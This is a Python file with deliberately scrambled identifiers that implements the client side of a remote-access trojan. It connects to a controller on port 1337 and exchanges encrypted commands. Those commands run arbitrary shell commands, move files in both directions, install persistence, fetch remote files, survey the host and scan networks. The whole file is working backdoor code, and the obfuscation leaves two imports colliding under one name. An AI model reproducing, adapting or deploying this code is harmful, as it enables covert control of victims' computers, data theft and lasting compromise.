#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket
import subprocess
import struct
import sys
try:
    from core.crypto import XYaDaLCpdDWbhHDijfqwaNYabStIUUmh, ZpfOVTDDOGytHjPnbATuBExgLHZMDMoS, vDmzYcBordgiIogLivOuAQaaFTKQAAzM
    from core.filesock import WxGcwiPDYRLzbqatyPwfpKjEErHxBDJt, kQpMdhVtDbXGIdiCoexmQnzVVIsSBSlE
    from core.persistence import lbBccHiiDmGapnfkBzGcriIbWppvyzNz
    from core.scan import nJbsVvmkIEyjoTbMKITynVDBoOUcrQfH
    from core.survey import lbBccHiiDmGapnfkBzGcriIbWppvyzNz
    from core.toolkit import rHHjbfnKBiRRdvWEKyKrcxfDJmjOAsAE, RbcepsCLJFdyLrfGPpeSTBlQPtvvVLEZ
except ImportError as xemCHVWpPapzHfyUCllmfgFOZDAoExtv:
    print(xemCHVWpPapzHfyUCllmfgFOZDAoExtv)
    sys.exit(0)
EKNegxyQatveUrfrHGzipMMwjVRNCNyA = sys.platform
XwVbIlGQYBbTmJRAzIilFsCstXqKyWZq      = 'localhost'
eFtaYhLuKXpmHirEAfjxyVxjSWpdpPAU      = 1337
moMtyQTIlaDXPYMhuLeZvWqyCpLExnzJ    = 'b14ce95fa4c33ac2803782d18341869f'
def xTbkhCtSUzQGTErSQyvaqKDHBfCsaeBT():
    KnysYSpUilAculyoRPGzkvTtOEZhUaga = socket.socket()
    KnysYSpUilAculyoRPGzkvTtOEZhUaga.connect((XwVbIlGQYBbTmJRAzIilFsCstXqKyWZq, eFtaYhLuKXpmHirEAfjxyVxjSWpdpPAU))
    ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh = vDmzYcBordgiIogLivOuAQaaFTKQAAzM(KnysYSpUilAculyoRPGzkvTtOEZhUaga)
    while True:
        XXsFToIaxFNwwNVuDnfPyhXLkTTdXaIK = KnysYSpUilAculyoRPGzkvTtOEZhUaga.recv(1024)
        XXsFToIaxFNwwNVuDnfPyhXLkTTdXaIK = XYaDaLCpdDWbhHDijfqwaNYabStIUUmh(XXsFToIaxFNwwNVuDnfPyhXLkTTdXaIK, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh)
        RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ, _, action = XXsFToIaxFNwwNVuDnfPyhXLkTTdXaIK.partition(' ')
        if RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'quit':
            KnysYSpUilAculyoRPGzkvTtOEZhUaga.close()
            sys.exit(0)
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'run':
            LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc = subprocess.Popen(action, shell=True,
                      stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                      stdin=subprocess.PIPE)
            LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc = LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc.stdout.read() + LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc.stderr.read()
            KnysYSpUilAculyoRPGzkvTtOEZhUaga.sendall(ZpfOVTDDOGytHjPnbATuBExgLHZMDMoS(LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh))
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'download':
            for CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE in action.split():
                CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE = CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE.strip()
                kQpMdhVtDbXGIdiCoexmQnzVVIsSBSlE(KnysYSpUilAculyoRPGzkvTtOEZhUaga, CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh)
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'upload':
            for CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE in action.split():
                CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE = CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE.strip()
                WxGcwiPDYRLzbqatyPwfpKjEErHxBDJt(KnysYSpUilAculyoRPGzkvTtOEZhUaga, CVDDVhtVlUrKmBPYyXqGVVzVOSUDmDdE, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh)
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'rekey':
            ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh = vDmzYcBordgiIogLivOuAQaaFTKQAAzM(KnysYSpUilAculyoRPGzkvTtOEZhUaga)
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'persistence':
            LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc = lbBccHiiDmGapnfkBzGcriIbWppvyzNz(EKNegxyQatveUrfrHGzipMMwjVRNCNyA)
            KnysYSpUilAculyoRPGzkvTtOEZhUaga.send(ZpfOVTDDOGytHjPnbATuBExgLHZMDMoS(LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh))
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'wget':
            LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc = rHHjbfnKBiRRdvWEKyKrcxfDJmjOAsAE(action)
            KnysYSpUilAculyoRPGzkvTtOEZhUaga.send(ZpfOVTDDOGytHjPnbATuBExgLHZMDMoS(LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh))
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'unzip':
            LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc = RbcepsCLJFdyLrfGPpeSTBlQPtvvVLEZ(action)
            KnysYSpUilAculyoRPGzkvTtOEZhUaga.send(ZpfOVTDDOGytHjPnbATuBExgLHZMDMoS(LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh))
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'survey':
            LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc = lbBccHiiDmGapnfkBzGcriIbWppvyzNz(EKNegxyQatveUrfrHGzipMMwjVRNCNyA)
            KnysYSpUilAculyoRPGzkvTtOEZhUaga.send(ZpfOVTDDOGytHjPnbATuBExgLHZMDMoS(LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh))
        elif RgWfQCPgkpUyDNiGXsJTwJvLpupUGcQJ == 'scan':
            LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc = nJbsVvmkIEyjoTbMKITynVDBoOUcrQfH(action)
            KnysYSpUilAculyoRPGzkvTtOEZhUaga.send(ZpfOVTDDOGytHjPnbATuBExgLHZMDMoS(LYrLArXEKHtLdMkUOPrCGRxYmOfobMyc, ojurtXzGqdlSoLvwCzMQHvdHqmuvjDbh))
if __name__ == '__main__':
    xTbkhCtSUzQGTErSQyvaqKDHBfCsaeBT()
